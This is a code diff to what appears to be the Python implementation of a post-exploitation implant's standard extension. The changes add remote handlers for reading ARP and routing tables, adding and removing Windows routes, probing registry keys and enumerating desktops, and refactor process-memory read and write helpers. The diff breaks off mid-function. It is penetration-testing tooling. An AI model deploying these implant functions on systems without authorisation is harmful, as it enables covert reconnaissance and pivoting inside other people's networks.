                 mount += tlv_pack(TLV_TYPE_MOUNT_UNCPATH, pUniversalNameInfo.lpUniversalName)
         # Retrieve information about the amount of space that is available on a disk volume
         user_free_bytes = ctypes.c_ulonglong(0)
@@ -1458,6 +2121,72 @@ def stdapi_fs_mount_show(request, response):
             mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_TOTAL, total_bytes.value)
             mount += tlv_pack(TLV_TYPE_MOUNT_SPACE_FREE, total_free_bytes.value)
         response += tlv_pack(TLV_TYPE_MOUNT_GROUP, mount)
+    return ERROR_SUCCESS, response
+
+@register_function_if(sys.platform.startswith('linux') or has_windll)
+def stdapi_net_config_get_arp_table(request, response):
+    if has_windll:
+        MIB_IPNET_TYPE_DYNAMIC = 3
+        MIB_IPNET_TYPE_STATIC  = 4
+
+        GetIpNetTable = ctypes.windll.iphlpapi.GetIpNetTable
+        GetIpNetTable.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_ulong), ctypes.c_long]
+        GetIpNetTable.restype = ctypes.c_ulong
+
+        ipnet_table = None
+        size = ctypes.c_ulong(0)
+        result = GetIpNetTable(ipnet_table, size, False)
+
+        if result == ERROR_INSUFFICIENT_BUFFER:
+            ipnet_table = ctypes.cast(ctypes.create_string_buffer(bytes(), size.value), ctypes.c_void_p)
+
+        elif result != ERROR_SUCCESS and result != ERROR_NO_DATA:
+            return error_result_windows(result), response
+
+        if not ipnet_table:
+            return error_result_windows(), response
+
+        result = GetIpNetTable(ipnet_table, size, False)
+        if result != ERROR_SUCCESS:
+            return error_result_windows(result), response
+
+        class MIB_IPNETTABLE(ctypes.Structure):
+            _fields_ = [
+                ('dwNumEntries', ctypes.c_uint32),
+                ('table', MIB_IPNETROW * ctypes.cast(ipnet_table.value, ctypes.POINTER(ctypes.c_ulong)).contents.value)
+            ]
+
+        ipnet_table = ctypes.cast(ipnet_table, ctypes.POINTER(MIB_IPNETTABLE))
+        for ipnet_row in ipnet_table.contents.table:
+            if (ipnet_row.dwType != MIB_IPNET_TYPE_DYNAMIC and ipnet_row.dwType != MIB_IPNET_TYPE_STATIC):
+                continue
+            arp_tlv  = bytes()
+            arp_tlv += tlv_pack(TLV_TYPE_IP, struct.pack('<L', ipnet_row.dwAddr))
+            arp_tlv += tlv_pack(TLV_TYPE_MAC_ADDRESS, bytes(ipnet_row.bPhysAddr)[:ipnet_row.dwPhysAddrLen])
+            arp_tlv += tlv_pack(TLV_TYPE_MAC_NAME, str(ipnet_row.dwIndex))
+            response += tlv_pack(TLV_TYPE_ARP_ENTRY, arp_tlv)
+
+    elif sys.platform.startswith('linux'):
+        arp_cache_file = '/proc/net/arp'
+        if not os.path.exists(arp_cache_file):
+            return ERROR_NOT_SUPPORTED, response
+
+        arp_cache = open('/proc/net/arp', 'r')
+        lines = arp_cache.readlines()
+        for line in lines[1:]:
+            fields = line.split()
+            ip_address = fields[0]
+            mac_address = fields[3]
+            mac_address = bytes().join(binascii.unhexlify(h) for h in mac_address.split(':'))
+            interface_name = fields[5]
+            arp_tlv  = bytes()
+            arp_tlv += tlv_pack(TLV_TYPE_IP, socket.inet_aton(ip_address))
+            arp_tlv += tlv_pack(TLV_TYPE_MAC_ADDRESS, mac_address)
+            arp_tlv += tlv_pack(TLV_TYPE_MAC_NAME, interface_name)
+            response += tlv_pack(TLV_TYPE_ARP_ENTRY, arp_tlv)
+        arp_cache.close()
+    else:
+        return ERROR_NOT_SUPPORTED, response
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1476,8 +2205,8 @@ def stdapi_net_config_get_interfaces(request, response):
         iface_tlv += tlv_pack(TLV_TYPE_MAC_ADDRESS, iface_info.get('hw_addr', '\x00\x00\x00\x00\x00\x00'))
         if 'mtu' in iface_info:
             iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_MTU, iface_info['mtu'])
-        if 'flags' in iface_info:
-            iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_FLAGS, iface_info['flags'])
+        if 'flags_str' in iface_info:
+            iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_FLAGS, iface_info['flags_str'])
         iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_INDEX, iface_info['index'])
         for address in iface_info.get('addrs', []):
             iface_tlv += tlv_pack(TLV_TYPE_IP, address[1])
@@ -1504,18 +2233,19 @@ def stdapi_net_config_get_interfaces_via_netlink():
     iface_flags_sorted.sort()
     interfaces = {}
 
-    responses = netlink_request(RTM_GETLINK)
+    responses = netlink_request(RTM_GETLINK, IFINFOMSG())
     for res_data in responses:
-        iface = cstruct_unpack(IFINFOMSG, res_data)
+        iface = ctstruct_unpack(IFINFOMSG, res_data)
         iface_info = {'index':iface.index}
         flags = []
         for flag in iface_flags_sorted:
             if (iface.flags & flag):
                 flags.append(iface_flags[flag])
-        iface_info['flags'] = ' '.join(flags)
+        iface_info['flags'] = iface.flags
+        iface_info['flags_str'] = ' '.join(flags)
         cursor = ctypes.sizeof(IFINFOMSG)
         while cursor < len(res_data):
-            attribute = cstruct_unpack(RTATTR, res_data[cursor:])
+            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
             at_len = attribute.len
             attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
             cursor += rta_align(at_len)
@@ -1528,15 +2258,15 @@ def stdapi_net_config_get_interfaces_via_netlink():
                 iface_info['mtu'] = struct.unpack('<I', attr_data)[0]
         interfaces[iface.index] = iface_info
 
-    responses = netlink_request(RTM_GETADDR)
+    responses = netlink_request(RTM_GETADDR, IFADDRMSG())
     for res_data in responses:
-        iface = cstruct_unpack(IFADDRMSG, res_data)
+        iface = ctstruct_unpack(IFADDRMSG, res_data)
         if not iface.family in (socket.AF_INET, socket.AF_INET6):
             continue
         iface_info = interfaces.get(iface.index, {})
         cursor = ctypes.sizeof(IFADDRMSG)
         while cursor < len(res_data):
-            attribute = cstruct_unpack(RTATTR, res_data[cursor:])
+            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
             at_len = attribute.len
             attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
             cursor += rta_align(at_len)
@@ -1556,22 +2286,19 @@ def stdapi_net_config_get_interfaces_via_netlink():
     return interfaces.values()
 
 def stdapi_net_config_get_interfaces_via_osx_ifconfig():
-    proc_h = subprocess.Popen('/sbin/ifconfig', stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    if proc_h.wait():
-        raise Exception('ifconfig exited with non-zero status')
-    output = proc_h.stdout.read()
-
+    output = get_process_output(['/sbin/ifconfig'])
     interfaces = []
     iface = {}
     for line in output.split('\n'):
-        match = re.match(r'^([a-z0-9]+): flags=(\d+)<[A-Z,]*> mtu (\d+)\s*$', line)
+        match = re.match(r'^([a-z0-9]+): flags=(\d+)<([A-Z,]*)> mtu (\d+)\s*$', line)
         if match is not None:
             if iface:
                 interfaces.append(iface)
             iface = {}
             iface['name'] = match.group(1)
             iface['flags'] = int(match.group(2))
-            iface['mtu'] = int(match.group(3))
+            iface['flags_str'] = match.group(3)
+            iface['mtu'] = int(match.group(4))
             iface['index'] = len(interfaces)
             continue
         match = re.match(r'^\s+ether (([a-f0-9]{2}:){5}[a-f0-9]{2})\s*$', line)
@@ -1598,8 +2325,6 @@ def stdapi_net_config_get_interfaces_via_osx_ifconfig():
 
 def stdapi_net_config_get_interfaces_via_windll():
     iphlpapi = ctypes.windll.iphlpapi
-    if not hasattr(iphlpapi, 'GetAdaptersAddresses'):
-        return stdapi_net_config_get_interfaces_via_windll_mib()
     Flags = (GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST)
     AdapterAddresses = ctypes.c_void_p()
     SizePointer = ctypes.c_ulong()
@@ -1608,14 +2333,14 @@ def stdapi_net_config_get_interfaces_via_windll():
     AdapterAddressesData = (ctypes.c_uint8 * SizePointer.value)()
     iphlpapi.GetAdaptersAddresses(socket.AF_UNSPEC, Flags, None, ctypes.byref(AdapterAddressesData), ctypes.byref(SizePointer))
     AdapterAddresses = ctypes.string_at(ctypes.byref(AdapterAddressesData), SizePointer.value)
-    AdapterAddresses = cstruct_unpack(IP_ADAPTER_ADDRESSES, AdapterAddresses)
+    AdapterAddresses = ctstruct_unpack(IP_ADAPTER_ADDRESSES, AdapterAddresses)
     if AdapterAddresses.u.s.Length <= 72:
-        return stdapi_net_config_get_interfaces_via_windll_mib()
+        raise RuntimeError('invalid AdapterAddresses length')
     win_version = windll_GetVersion()
     interfaces = []
     pAdapterAddresses = ctypes.byref(AdapterAddresses)
     while pAdapterAddresses:
-        AdapterAddresses = cstruct_unpack(IP_ADAPTER_ADDRESSES, pAdapterAddresses)
+        AdapterAddresses = ctstruct_unpack(IP_ADAPTER_ADDRESSES, pAdapterAddresses)
         pAdapterAddresses = AdapterAddresses.Next
         pFirstPrefix = AdapterAddresses.FirstPrefix
         iface_info = {}
@@ -1629,9 +2354,9 @@ def stdapi_net_config_get_interfaces_via_windll():
         iface_info['mtu'] = AdapterAddresses.Mtu
         pUniAddr = AdapterAddresses.FirstUnicastAddress
         while pUniAddr:
-            UniAddr = cstruct_unpack(IP_ADAPTER_UNICAST_ADDRESS, pUniAddr)
+            UniAddr = ctstruct_unpack(IP_ADAPTER_UNICAST_ADDRESS, pUniAddr)
             pUniAddr = UniAddr.Next
-            address = cstruct_unpack(SOCKADDR, UniAddr.Address.lpSockaddr)
+            address = ctstruct_unpack(SOCKADDR, UniAddr.Address.lpSockaddr)
             if not address.sa_family in (socket.AF_INET, socket.AF_INET6):
                 continue
             prefix = 0
@@ -1650,34 +2375,246 @@ def stdapi_net_config_get_interfaces_via_windll():
         interfaces.append(iface_info)
     return interfaces
 
-def stdapi_net_config_get_interfaces_via_windll_mib():
-    iphlpapi = ctypes.windll.iphlpapi
-    table = (ctypes.c_uint8 * (ctypes.sizeof(MIB_IPADDRROW) * 33))()
-    pdwSize = ctypes.c_ulong()
-    pdwSize.value = ctypes.sizeof(table)
-    if (iphlpapi.GetIpAddrTable(ctypes.byref(table), ctypes.byref(pdwSize), True) != 0):
-        return None
-    interfaces = []
-    table_data = ctypes.string_at(table, pdwSize.value)
-    entries = struct.unpack('I', table_data[:4])[0]
-    table_data = table_data[4:]
-    for i in range(entries):
-        addrrow = cstruct_unpack(MIB_IPADDRROW, table_data)
-        ifrow = MIB_IFROW()
-        ifrow.dwIndex = addrrow.dwIndex
-        if iphlpapi.GetIfEntry(ctypes.byref(ifrow)) != 0:
+@register_function
+def stdapi_net_config_get_routes(request, response):
+    if hasattr(socket, 'AF_NETLINK') and hasattr(socket, 'NETLINK_ROUTE'):
+        routes = stdapi_net_config_get_routes_via_netlink()
+    elif sys.platform == 'darwin':
+        routes = stdapi_net_config_get_routes_via_osx_netstat()
+    elif has_windll:
+        routes = stdapi_net_config_get_routes_via_windll()
+    else:
+        return ERROR_FAILURE, response
+    for route_info in routes:
+        route_tlv  = bytes()
+        route_tlv += tlv_pack(TLV_TYPE_SUBNET, route_info['subnet'])
+        route_tlv += tlv_pack(TLV_TYPE_NETMASK, route_info['netmask'])
+        route_tlv += tlv_pack(TLV_TYPE_GATEWAY, route_info['gateway'])
+        route_tlv += tlv_pack(TLV_TYPE_STRING, route_info['iface'])
+        route_tlv += tlv_pack(TLV_TYPE_ROUTE_METRIC, route_info.get('metric', 0))
+        response += tlv_pack(TLV_TYPE_NETWORK_ROUTE, route_tlv)
+    return ERROR_SUCCESS, response
+
+def _win_route_add_remove(is_add, request, response):
+    class IPAddr(ctypes.Structure):
+        _fields_ = [
+            ("S_addr", ctypes.c_ulong)]
+
+    MIB_IPROUTE_TYPE_INDIRECT = 4
+    MIB_IPPROTO_NETMGMT = 3
+
+    GetBestInterface = ctypes.windll.Iphlpapi.GetBestInterface
+    GetBestInterface.argtypes = [IPAddr, ctypes.POINTER(ctypes.c_ulong)]
+    GetBestInterface.restype = ctypes.c_ulong
+
+    CreateIpForwardEntry = ctypes.windll.Iphlpapi.CreateIpForwardEntry
+    CreateIpForwardEntry.argtypes = [PMIB_IPFORWARDROW]
+    CreateIpForwardEntry.restype = ctypes.c_ulong
+
+    DeleteIpForwardEntry = ctypes.windll.Iphlpapi.DeleteIpForwardEntry
+    DeleteIpForwardEntry.argtypes = [PMIB_IPFORWARDROW]
+    DeleteIpForwardEntry.restype = ctypes.c_ulong
+
+    GetIpInterfaceEntry = ctypes.windll.Iphlpapi.GetIpInterfaceEntry
+    GetIpInterfaceEntry.argtypes = [ctypes.POINTER(MIB_IPINTERFACE_ROW)]
+    GetIpInterfaceEntry.restype = ctypes.c_ulong
+
+    subnet = packet_get_tlv(request, TLV_TYPE_SUBNET_STRING)['value']
+    netmask = packet_get_tlv(request, TLV_TYPE_NETMASK_STRING)['value']
+    gateway = packet_get_tlv(request, TLV_TYPE_GATEWAY_STRING)['value']
+
+    route = MIB_IPFORWARDROW()
+    route.dwForwardDest = socket.ntohl(addr_atoi4(subnet))
+    route.dwForwardMask = socket.ntohl(addr_atoi4(netmask))
+    route.dwForwardNextHop = socket.ntohl(addr_atoi4(gateway))
+    route.dwForwardType = MIB_IPROUTE_TYPE_INDIRECT
+    route.dwForwardProto = MIB_IPPROTO_NETMGMT
+    route.dwForwardAge = -1
+    route.dwForwardMetric1 = 0
+
+    best_iface = ctypes.c_ulong()
+    ip_addr = IPAddr(socket.ntohl(addr_atoi4(subnet)))
+    result = GetBestInterface(ip_addr, ctypes.byref(best_iface))
+    if result != ERROR_SUCCESS:
+        return error_result_windows(result), response
+    route.dwForwardIfIndex = best_iface
+
+    iface = MIB_IPINTERFACE_ROW(Family=WIN_AF_INET, InterfaceIndex=route.dwForwardIfIndex)
+    result = GetIpInterfaceEntry(ctypes.byref(iface))
+    if result != ERROR_SUCCESS:
+        return error_result_windows(result), response
+    route.dwForwardMetric1 = iface.Metric
+
+    if is_add:
+        result = CreateIpForwardEntry(ctypes.byref(route))
+    else:
+        result = DeleteIpForwardEntry(ctypes.byref(route))
+    if result != ERROR_SUCCESS:
+        return error_result_windows(result), response
+
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_net_config_add_route(request, response):
+    return _win_route_add_remove(True, request, response)
+
+@register_function_if(has_windll)
+def stdapi_net_config_remove_route(request, response):
+    return _win_route_add_remove(False, request, response)
+
+def stdapi_net_config_get_routes_via_netlink():
+    rta_align = lambda l: l+3 & ~3
+    responses = netlink_request(RTM_GETROUTE, RTMSG(family=socket.AF_UNSPEC))
+    routes = []
+    for res_data in responses:
+        rtmsg = ctstruct_unpack(RTMSG, res_data)
+        cursor = rta_align(ctypes.sizeof(RTMSG))
+        route = {'table': rtmsg.table}
+        if rtmsg.family == socket.AF_INET:
+            route['gateway'] = route['subnet'] = inet_pton(socket.AF_INET, '0.0.0.0')
+            route['netmask'] = calculate_32bit_netmask(rtmsg.dst_len)
+        elif rtmsg.family == socket.AF_INET6:
+            route['gateway'] = route['subnet'] = inet_pton(socket.AF_INET6, '::')
+            route['netmask'] = calculate_128bit_netmask(rtmsg.dst_len)
+        else:
+          continue
+        while cursor < len(res_data):
+            attribute = ctstruct_unpack(RTATTR, res_data[cursor:])
+            at_len = attribute.len
+            attr_data = res_data[cursor + ctypes.sizeof(RTATTR):(cursor + at_len)]
+            cursor += rta_align(at_len)
+            if attribute.type == RTA_DST:
+                route['subnet'] = attr_data
+            if attribute.type == RTA_GATEWAY:
+                route['gateway'] = attr_data
+            elif attribute.type == RTA_TABLE:
+                route['table'] = struct.unpack('<I', attr_data)[0]
+            elif attribute.type == RTA_OIF:
+                route['iface'] = _linux_if_indextoname(struct.unpack('<I', attr_data)[0])
+            elif attribute.type == RTA_PRIORITY:
+                route['metric'] = struct.unpack('<I', attr_data)[0]
+        if route['table'] != RT_TABLE_MAIN:
             continue
-        iface_info = {}
-        table_data = table_data[ctypes.sizeof(MIB_IPADDRROW):]
-        iface_info['index'] = addrrow.dwIndex
-        iface_info['addrs'] = [(socket.AF_INET, struct.pack('<I', addrrow.dwAddr), struct.pack('<I', addrrow.dwMask))]
-        if ifrow.dwPhysAddrLen:
-            iface_info['hw_addr'] = ctypes.string_at(ctypes.byref(ifrow.bPhysAddr), ifrow.dwPhysAddrLen)
-        if ifrow.dwDescrLen:
-            iface_info['name'] = ifrow.bDescr
-        iface_info['mtu'] = ifrow.dwMtu
-        interfaces.append(iface_info)
-    return interfaces
+        routes.append(route)
+    return routes
+
+def stdapi_net_config_get_routes_via_osx_netstat():
+    output = get_process_output(['/usr/sbin/netstat', '-rn'])
+    routes = []
+    state = None
+    has_refs = None
+    for line in output.split('\n'):
+        line = line.strip()
+        if state is None:
+            if line == 'Internet:':
+                state = socket.AF_INET
+            elif line == 'Internet6:':
+                state = socket.AF_INET6
+            continue
+        words = line.split()
+        if len(words) < 4:
+            state = None
+            has_refs = None
+            continue
+        if words[0].lower() == 'destination':
+            if len(words) > 5 and words[3].lower() == 'refs':
+                has_refs = True
+            continue
+        destination, gateway, flags, iface = words[:4]
+        if has_refs:
+            iface = words[5]
+        if state == socket.AF_INET:
+            all_nets = '0.0.0.0/0'
+            bits = 32
+            calc_netmask = calculate_32bit_netmask
+        elif state == socket.AF_INET6:
+            all_nets = '::/0'
+            bits = 128
+            calc_netmask = calculate_128bit_netmask
+        else:
+            continue
+        if destination == 'default':
+            destination = all_nets
+        if re.match('link#\\d+', gateway) or re.match('([0-9a-f]{1,2}:){5}[0-9a-f]{1,2}', gateway) or re.match('([0-9a-f]{1,2}.){5}[0-9a-f]{1,2}', gateway):
+            gateway = all_nets[:-2]
+        if '/' in destination:
+            destination, netmask_bits = destination.rsplit('/', 1)
+            netmask_bits = int(netmask_bits)
+        else:
+            netmask_bits = bits
+        if '%' in destination:
+            destination, _ = destination.rsplit('%', 1)
+        if '%' in gateway:
+            gateway, _ = gateway.rsplit('%', 1)
+        if state == socket.AF_INET:
+            while destination.count('.') < 3:
+                destination += '.0'
+        routes.append({
+            'subnet': inet_pton(state, destination),
+            'netmask': calc_netmask(netmask_bits),
+            'gateway': inet_pton(state, gateway),
+            'metric': 0,
+            'iface': iface
+        })
+    return routes
+
+def stdapi_net_config_get_routes_via_windll():
+    iphlpapi = ctypes.windll.iphlpapi
+    if not hasattr(iphlpapi, 'GetIpForwardTable2'):  # added in Vista / 2008
+        return stdapi_net_config_get_routes_via_windll2()
+    routes = []
+    iface_names = {}
+    for iface in stdapi_net_config_get_interfaces_via_windll():
+        iface_names[iface['index']] = iface['name']
+    for family in [WIN_AF_INET, WIN_AF_INET6]:
+        table = PMIB_IPFORWARD_TABLE2()
+        if iphlpapi.GetIpForwardTable2(family, ctypes.byref(table)):
+            continue
+        table = table.contents
+        rows = ctypes.cast(table.Table, PMIB_IPFORWARD_ROW2)
+        for index in range(table.NumEntries):
+            row = rows[index]
+            route = {}
+            if family == WIN_AF_INET:
+                route['subnet'] = ctarray_to_bytes(row.DestinationPrefix.Prefix.Ipv4.sin_addr)
+                route['netmask'] = calculate_32bit_netmask(row.DestinationPrefix.PrefixLength)
+                route['gateway'] = ctarray_to_bytes(row.NextHop.Ipv4.sin_addr)
+            elif family == WIN_AF_INET6:
+                route['subnet'] = ctarray_to_bytes(row.DestinationPrefix.Prefix.Ipv6.sin6_addr)
+                route['netmask'] = calculate_128bit_netmask(row.DestinationPrefix.PrefixLength)
+                route['gateway'] = ctarray_to_bytes(row.NextHop.Ipv6.sin6_addr)
+            iface = MIB_IPINTERFACE_ROW(Family=family, InterfaceIndex=row.InterfaceIndex)
+            if iphlpapi.GetIpInterfaceEntry(ctypes.byref(iface)):
+                continue
+            route['metric'] = row.Metric + iface.Metric
+            route['iface'] = iface_names.get(row.InterfaceIndex, str(row.InterfaceIndex))
+            routes.append(route)
+    return routes
+
+def stdapi_net_config_get_routes_via_windll2():
+    iphlpapi = ctypes.windll.iphlpapi
+    routes = []
+    iface_names = {}
+    for iface in stdapi_net_config_get_interfaces_via_windll():
+        iface_names[iface['index']] = iface['name']
+    size = ctypes.c_uint32(0)
+    table = MIB_IPFORWARDTABLE()
+    iphlpapi.GetIpForwardTable(ctypes.byref(table), ctypes.byref(size), False)
+    if size.value:
+        buffer = (ctypes.c_uint8 * size.value)()
+        table = ctypes.cast(buffer, PMIB_IPFORWARDTABLE).contents
+        iphlpapi.GetIpForwardTable(ctypes.byref(table), ctypes.byref(size), False)
+        rows = ctypes.cast(table.table, PMIB_IPFORWARDROW)
+        for index in range(table.dwNumEntries):
+            row = rows[index]
+            routes.append({
+                'subnet': struct.pack('<I', row.dwForwardDest),
+                'netmask': struct.pack('<I', row.dwForwardMask),
+                'gateway': struct.pack('<I', row.dwForwardNextHop),
+                'metric': row.dwForwardMetric1,
+                'iface': iface_names.get(row.dwForwardIfIndex, str(row.dwForwardIfIndex))
+            })
+    return routes
 
 @register_function_if(has_windll)
 def stdapi_net_config_get_proxy(request, response):
@@ -1777,8 +2714,12 @@ def _linux_check_maps(address, size, perms=''):
         cursor = region['address-end']
     return True
 
+def _linux_if_indextoname(index):
+    name = (ctypes.c_char * 256)()
+    if libc.if_indextoname(index, name):
+        return name.value.decode('ascii')
+
 def _linux_memread(address, size):
-    libc = ctypes.cdll.LoadLibrary('libc.so.6')
     if not hasattr(libc, 'process_vm_readv'):
         # requires linux 3.2+ / glibc 2.15+, see:
         # http://man7.org/linux/man-pages/man2/process_vm_readv.2.html#VERSIONS
@@ -1801,7 +2742,6 @@ def _linux_memread(address, size):
     return ctarray_to_bytes(buff)
 
 def _linux_memwrite(address, data):
-    libc = ctypes.cdll.LoadLibrary('libc.so.6')
     if not hasattr(libc, 'process_vm_writev'):
         # requires linux 3.2+ / glibc 2.15+, see:
         # http://man7.org/linux/man-pages/man2/process_vm_writev.2.html#VERSIONS
@@ -1825,7 +2765,6 @@ def _linux_memwrite(address, data):
     return size
 
 def _osx_memread(address, size):
-    libc = ctypes.CDLL(ctypes.util.find_library('c'))
     task = libc.mach_task_self()
     libc.mach_vm_read.argtypes = [ctypes.c_uint32, size_t, size_t, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_uint32)]
     libc.mach_vm_read.restype = ctypes.c_uint32
@@ -1842,7 +2781,6 @@ def _osx_memread(address, size):
     return ctarray_to_bytes(buff.contents)
 
 def _osx_memwrite(address, data):
-    libc = ctypes.CDLL(ctypes.util.find_library('c'))
     task = libc.mach_task_self()
     libc.mach_vm_write.argtypes = [ctypes.c_uint32, size_t, ctypes.c_void_p, ctypes.c_uint32]
     libc.mach_vm_write.restype = ctypes.c_uint32
@@ -1945,10 +2883,6 @@ def stdapi_railgun_api(request, response):
     debug_print('[*] railgun calling: ' + lib_name + '!' + func_name)
     prototype = func_type(native, *func_args)
     if sys.platform == 'darwin' or sys.platform.startswith('linux'):
-        if sys.platform == 'darwin':
-            libc = ctypes.CDLL(ctypes.util.find_library('c'))
-        else:
-            libc = ctypes.cdll.LoadLibrary('libc.so.6')
         p_errno = ctypes.cast(libc.errno, ctypes.POINTER(ctypes.c_int))
         errno = p_errno.contents
         last_error = ctypes.c_int(0)
@@ -1973,7 +2907,7 @@ def stdapi_railgun_api(request, response):
             if last_error == ERROR_SUCCESS:
                 error_message = 'The operation completed successfully.'
             else:
-                error_message = 'FormatMessage failed to retrieve the error.'
+                error_message = 'FormatMessage failed to retrieve the error for value ' + hex(last_error) + '.'
     else:
         raise RuntimeError('unknown platform')
 
@@ -2153,14 +3087,26 @@ def stdapi_registry_load_key(request, response):
 def _wreg_close_key(hkey):
     ctypes.windll.advapi32.RegCloseKey(hkey)
 
-def _wreg_open_key(request):
+def _wreg_open_key(request, permission=None):
     root_key = packet_get_tlv(request, TLV_TYPE_ROOT_KEY)['value']
+    root_key_names = {
+        winreg.HKEY_CLASSES_ROOT & 0xffffffff: 'HKCR',
+        winreg.HKEY_CURRENT_USER & 0xffffffff: 'HKCU',
+        winreg.HKEY_LOCAL_MACHINE & 0xffffffff: 'HKLM',
+        winreg.HKEY_USERS & 0xffffffff: 'HKU',
+        winreg.HKEY_PERFORMANCE_DATA & 0xffffffff: 'HKPD',
+        winreg.HKEY_CURRENT_CONFIG & 0xffffffff: 'HKCC'
+    }
+    root_key_name = root_key_names.get(root_key, 'HK??')
     base_key = packet_get_tlv(request, TLV_TYPE_BASE_KEY)['value']
+    debug_print('[*] opening registry key: ' + root_key_name + '\\' + unicode(base_key))
     base_key = ctypes.create_string_buffer(bytes(base_key, 'UTF-8'))
-    permission = packet_get_tlv(request, TLV_TYPE_PERMISSION).get('value', winreg.KEY_ALL_ACCESS)
+    if permission is None:
+        permission = packet_get_tlv(request, TLV_TYPE_PERMISSION).get('value', winreg.KEY_ALL_ACCESS)
     handle_id = ctypes.c_void_p()
-    if ctypes.windll.advapi32.RegOpenKeyExA(root_key, ctypes.byref(base_key), 0, permission, ctypes.byref(handle_id)) != ERROR_SUCCESS:
-        return error_result_windows(), 0
+    result = ctypes.windll.advapi32.RegOpenKeyExA(root_key, ctypes.byref(base_key), 0, permission, ctypes.byref(handle_id))
+    if result != ERROR_SUCCESS:
+        return error_result_windows(result), 0
     return ERROR_SUCCESS, handle_id.value
 
 def _wreg_query_value(request, response, hkey):
@@ -2187,7 +3133,7 @@ def _wreg_query_value(request, response, hkey):
         else:
             response += tlv_pack(TLV_TYPE_VALUE_DATA, ctypes.string_at(value_data, value_data_sz.value))
         return ERROR_SUCCESS, response
-    return error_result_windows(), response
+    return error_result_windows(result), response
 
 def _wreg_set_value(request, response, hkey):
     value_name = packet_get_tlv(request, TLV_TYPE_VALUE_NAME)['value']
@@ -2195,7 +3141,19 @@ def _wreg_set_value(request, response, hkey):
     value_type = packet_get_tlv(request, TLV_TYPE_VALUE_TYPE)['value']
     value_data = packet_get_tlv(request, TLV_TYPE_VALUE_DATA)['value']
     result = ctypes.windll.advapi32.RegSetValueExA(hkey, ctypes.byref(value_name), 0, value_type, value_data, len(value_data))
-    return result, response
+    if result == ERROR_SUCCESS:
+        return ERROR_SUCCESS, response
+    return error_result_windows(result), response
+
+@register_function_if(has_windll)
+def stdapi_registry_check_key_exists(request, response):
+    err, hkey = _wreg_open_key(request, permission=winreg.KEY_QUERY_VALUE)
+    if err == ERROR_SUCCESS:
+        _wreg_close_key(hkey)
+        response += tlv_pack(TLV_TYPE_BOOL, True)
+    else:
+        response += tlv_pack(TLV_TYPE_BOOL, False)
+    return ERROR_SUCCESS, response
 
 @register_function_if(has_windll)
 def stdapi_registry_open_key(request, response):
@@ -2235,7 +3193,7 @@ def stdapi_registry_query_value(request, response):
 def stdapi_registry_query_value_direct(request, response):
     err, hkey = _wreg_open_key(request)
     if err != ERROR_SUCCESS:
-        return err, response
+        return error_result_windows(err), response
     ret = _wreg_query_value(request, response, hkey)
     _wreg_close_key(hkey)
     return ret
@@ -2249,7 +3207,7 @@ def stdapi_registry_set_value(request, response):
 def stdapi_registry_set_value_direct(request, response):
     err, hkey = _wreg_open_key(request)
     if err != ERROR_SUCCESS:
-        return err, response
+        return error_result_windows(err), response
     ret = _wreg_set_value(request, response, hkey)
     _wreg_close_key(hkey)
     return ret
@@ -2274,4 +3232,146 @@ def stdapi_ui_get_idle_time(request, response):
     GetTickCount.restype = ctypes.c_uint32
     idle_time = (GetTickCount() - info.dwTime) / 1000
     response += tlv_pack(TLV_TYPE_IDLE_TIME, idle_time)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_ui_desktop_enum(request, response):
+    response_parts = []
+    if ctypes.sizeof(ctypes.c_long) == ctypes.sizeof(ctypes.c_void_p):
+        LPARAM = ctypes.c_long
+    elif ctypes.sizeof(ctypes.c_longlong) == ctypes.sizeof(ctypes.c_void_p):
+        LPARAM = ctypes.c_longlong
+
+    DESKTOPENUMPROCA = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_char_p, LPARAM)
+    EnumDesktopsA = ctypes.windll.user32.EnumDesktopsA
+    EnumDesktopsA.argtypes = [ctypes.c_void_p, DESKTOPENUMPROCA, LPARAM]
+    EnumDesktopsA.restype = ctypes.c_long
+
+    WINSTAENUMPROCA = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_char_p, LPARAM)
+    EnumWindowStationsA = ctypes.windll.user32.EnumWindowStationsA
+    EnumWindowStationsA.argtypes = [WINSTAENUMPROCA, LPARAM]
+    EnumWindowStationsA.restype = ctypes.c_long
+
+    OpenWindowStationA = ctypes.windll.user32.OpenWindowStationA
+    OpenWindowStationA.argtypes = [ctypes.c_char_p, ctypes.c_long, ctypes.c_bool]
+    OpenWindowStationA.restype = ctypes.c_void_p
+
+    CloseWindowStation = ctypes.windll.user32.CloseWindowStation
+    CloseWindowStation.argtypes = [ctypes.c_void_p]
+    CloseWindowStation.restype = ctypes.c_long
+
+    GetCurrentProcessId = ctypes.windll.kernel32.GetCurrentProcessId
+    GetCurrentProcessId.restype = ctypes.c_ulong
+
+    GetProcAddress = ctypes.windll.kernel32.GetProcAddress
+    GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
+    GetProcAddress.restype = ctypes.c_void_p
+
+    def get_session_id(pid):
+        dwSessionId = ctypes.c_ulong(0)
+
+        ProcessIdToSessionId = ctypes.windll.kernel32.ProcessIdToSessionId
+        ProcessIdToSessionId.argtypes = [ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
+        ProcessIdToSessionId.restype = ctypes.c_bool
+
+        if not ProcessIdToSessionId(ctypes.c_ulong(pid), ctypes.byref(dwSessionId)):
+            dwSessionId = ctypes.c_ulong(-1)
+
+        return dwSessionId
+
+
+    def desktop_enumdesktops_callback(response_parts, session_id, station_name, lpszDesktop, lParam):
+        if not station_name or not lpszDesktop:
+            return True
+
+        entry  = bytes()
